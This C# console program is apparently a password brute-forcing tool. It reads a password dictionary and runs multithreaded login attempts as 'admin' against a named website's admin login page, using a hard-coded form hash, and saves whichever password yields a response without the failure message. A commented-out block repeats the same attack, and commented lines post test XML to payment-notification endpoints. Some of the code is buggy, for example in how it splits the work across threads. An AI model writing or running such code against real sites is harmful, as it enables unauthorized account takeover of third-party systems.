using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace PostNodify
{
    class Program
    {
        static void Main(string[] args)
        {
            //HttpWebRequestPost("http://localhost:6832/WxPay/Notify", "<xml><sign></sign></xml>");
            //Post("https://pm.shundaonetwork.com/public/home/Notify", "<xml><sign></sign></xml>");
            //Post("http://localhost:21021/api/services/app/MobliePay/Nodify", "<xml><sign>abccc</sign></xml>");
            //Post("http://localhost:21021/Nodify/MobliePay", "<xml><sign>abccc</sign></xml>");
            //Post("http://localhost:21021/Nodify/Test2", "<xml><sign>abccc</sign></xml>");
            //string[] line = File.ReadAllLines(@"C:\Users\hewei\Desktop\400W.txt");
            //foreach (var item in line)
            //{
            //    string result = PostFrom("http://ceshi.tombsale.com/admin/user/login", $"username=admin&password={item}&__hash__=d7b4af35b71c22996adb904671f0ecd3_054874de5e03895f0b95ac76534b755b");
            //    Console.WriteLine(item);
            //    if (result.Length != 1560)
            //    {
            //        break;
            //    }
            //}
            SaveFile.ToTxt("我是密码", Directory.GetCurrentDirectory() + @"\密码.txt");
            Console.WriteLine("hi 猛男");
            Console.WriteLine("请输入文件夹路径:");
            string path = Console.ReadLine();
            string[] line = File.ReadAllLines(path);
            Console.WriteLine("密码字典加载成功");
            int taskcount;
            while (true)
            {
                Console.WriteLine("请输入线程数!");
                string num = Console.ReadLine();
                if (int.TryParse(num, out taskcount))
                {
                    break;
                }
            }

            var st = LoadTxtPost(line, "http://ceshi.tombsale.com/admin/user/login", taskcount);
            Console.WriteLine("结束，这里有密码。");
            Console.WriteLine("密码=================>" + st);
            Console.WriteLine("post over");
            Console.ReadKey();

        }
        public static void HttpWebRequestPost(string url, string xml)
        {
            UTF8Encoding encoding = new UTF8Encoding();
            byte[] data = encoding.GetBytes(xml);
            HttpWebRequest webRequest = (HttpWebRequest)WebRequest.Create(url);
            webRequest.Method = "GET";
            webRequest.ContentType = "text/xml";
            webRequest.ContentLength = data.Length;
            Stream newStream = webRequest.GetRequestStream();
            newStream.Write(data, 0, data.Length);
            newStream.Close();
            HttpWebResponse myResponse = (HttpWebResponse)webRequest.GetResponse();
            StreamReader reader = new StreamReader(myResponse.GetResponseStream(), Encoding.UTF8);
            Console.WriteLine(reader.ReadToEnd());
        }
        public static async void Post(string url, string xml)
        {
            UTF8Encoding encoding = new UTF8Encoding();
            byte[] data = encoding.GetBytes(xml);
            HttpClient hc = new HttpClient();
            ByteArrayContent bt = new ByteArrayContent(data);
            var response = await hc.PostAsync(url, bt);
            Console.WriteLine(await response.Content.ReadAsStringAsync());
        }
        public static string PostFrom(string url, string postDataStr)
        {
            string retString = "";

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.CookieContainer = new CookieContainer();
            CookieContainer cookie = request.CookieContainer;//如果用不到Cookie，删去即可  
                                                             //以下是发送的http头，随便加，其中referer挺重要的，有些网站会根据这个来反盗链  
            request.Referer = "http://ceshi.tombsale.com/admin/user/login";
            request.Accept = "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
            request.Headers["Accept-Language"] = "zh-CN,zh;q=0.";
            request.Headers["Accept-Charset"] = "GBK,utf-8;q=0.7,*;q=0.3";
            request.UserAgent = "User-Agent:Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1";
            request.KeepAlive = true;
            //上面的http头看情况而定，但是下面俩必须加  
            request.ContentType = "application/x-www-form-urlencoded";
            request.Method = "POST";

            Encoding encoding = Encoding.UTF8;//根据网站的编码自定义  
            byte[] postData = encoding.GetBytes(postDataStr);//postDataStr即为发送的数据，格式还是和上次说的一样  
            request.ContentLength = postData.Length;
            Stream requestStream = request.GetRequestStream();

            requestStream.Write(postData, 0, postData.Length);
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            Stream responseStream = response.GetResponseStream();
            //如果http头中接受gzip的话，这里就要判断是否为有压缩，有的话，直接解压缩即可  
            if (response.Headers["Content-Encoding"] != null && response.Headers["Content-Encoding"].ToLower().Contains("gzip"))
            {
                responseStream = new GZipStream(responseStream, CompressionMode.Decompress);
            }

            StreamReader streamReader = new StreamReader(responseStream, encoding);
            retString = streamReader.ReadToEnd();

            streamReader.Close();
            responseStream.Close();
            return retString;
        }

        public static string PostArray(string[] line, int tasknum)
        {
            foreach (var item in line)
            {
                string result = PostFrom("http://ceshi.tombsale.com/admin/user/login", $"username=admin&password={item}&__hash__=d7b4af35b71c22996adb904671f0ecd3_054874de5e03895f0b95ac76534b755b");
                if (!result.Contains("操作失败"))
                {
                    Console.WriteLine(item + "=" + tasknum);
                    return item;
                }
                Console.WriteLine(item + "=" + tasknum);
            }
            return "";

        }
        public static string LoadTxtPost(string[] line, string url, int tasknum)
        {
            string pws = "";
            int count = line.Length / tasknum;
            int yu = line.Length % tasknum;
            Task[] tasks = new Task[tasknum];
            for (int i = 0; i < tasknum; i++)
            {
                var l = line.Skip(count * i).Take(count).ToArray();
                tasks[i] = Task.Factory.StartNew(() =>
                {
                    string pw = PostArray(l, i);
                    if (pw != "")
                    {
                        pws = pw;
                        SaveFile.ToTxt(Directory.GetCurrentDirectory() + "密码.txt", pws);
                        foreach (var item in tasks)
                        {
                            item.Dispose();
                        }
                    }
                });
            }
            try
            {
                Task.WaitAll(tasks);
            }
            catch (AggregateException ae)
            {
                Console.WriteLine(ae.Message);
                SaveFile.ToTxt(ae.Message, Directory.GetCurrentDirectory() + @"\异常.txt");
                throw ae.Flatten();
            }

            return pws;
        }

        public static void LoadFilesPost(string path)
        {
            var files = Directory.GetFiles(path).ToList();
            Task[] tasks = new Task[4];
            for (int i = 0; i < files.Count; i = i + 4)
            {
                tasks[0] = Task.Factory.StartNew(() =>
                 {

                 });
                tasks[1] = Task.Factory.StartNew(() =>
                  {

                  });
                tasks[2] = Task.Factory.StartNew(() =>
                 {

                 });
                tasks[3] = Task.Factory.StartNew(() =>
                 {

                 });
            }

        }
    }

}
